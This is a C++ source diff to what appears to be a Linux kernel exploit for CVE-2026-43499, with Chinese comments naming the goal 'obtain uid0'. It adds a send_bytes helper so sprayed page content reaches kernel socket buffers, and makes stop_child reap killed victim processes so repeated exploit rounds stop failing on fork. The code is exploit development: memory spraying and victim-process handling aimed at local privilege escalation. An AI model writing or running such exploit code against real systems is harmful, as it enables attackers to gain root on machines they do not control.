@@ -18,6 +18,7 @@
 #include <signal.h>
 #include <sys/mman.h>
 #include <sys/socket.h>
+#include <sys/wait.h>   /* waitpid ✓：stop_child 杀完必须收割（第 8 轮 ✓）。 */
 #include <sys/syscall.h>
 #include <unistd.h>
 
@@ -91,6 +92,17 @@ namespace ghostlock::backend::cve_2026_43499::memory {
             return SeamResult{static_cast<std::int64_t>(rc), errno};
         }
 
+        /** 发送**指定内容**（退役的 sendmsg(skb_buf) ✓）：页面必须走这条路进内核，
+         *  否则内核里的 skb 是零、页面等于没放（本树此前正是如此 ✗）。 */
+        static SeamResult send_bytes(std::int32_t fd, const void *data, std::size_t bytes) noexcept {
+            errno = 0;
+            if (data == nullptr || bytes == 0U) {
+                return SeamResult{-1, EINVAL};
+            }
+            const ssize_t sent = ::send(fd, data, bytes, 0);
+            return SeamResult{static_cast<std::int64_t>(sent), errno};
+        }
+
         static SeamResult send_buffer(std::int32_t fd, std::size_t bytes) noexcept {
             errno = 0;
             static unsigned char buffer[1U << 20U];
@@ -108,7 +120,15 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         static SeamResult stop_child(std::uint64_t pid) noexcept {
             errno = 0;
             const int rc = ::kill(static_cast<pid_t>(pid), SIGKILL);
-            return SeamResult{static_cast<std::int64_t>(rc), errno};
+            const int saved = errno;
+            /* ★ 杀完必须**收割**（新目标「取得 uid0」第 8 轮 ✓）：旧码只 `kill` ✗ ⇒ 僵尸累积 ⇒
+             *  僵尸同样占进程表 ⇒ 5–6 轮即 `fork` 撞 **EAGAIN**（errno=11 ✓，真机实证 ✓）⇒
+             *  `victim-fork-failed` ✗。此处按 `VictimContext::retire_child()` 同形收（EINTR 重试 ✓）。
+             *  判据：`main: victim fork failed errno=` 消失 ✓ ⇒ 15 轮跑满 ✓。 */
+            while (::waitpid(static_cast<pid_t>(pid), nullptr, 0) < 0 && errno == EINTR) {
+            }
+            errno = saved;
+            return SeamResult{static_cast<std::int64_t>(rc), saved};
         }
 
         static SeamResult yield_now() noexcept {
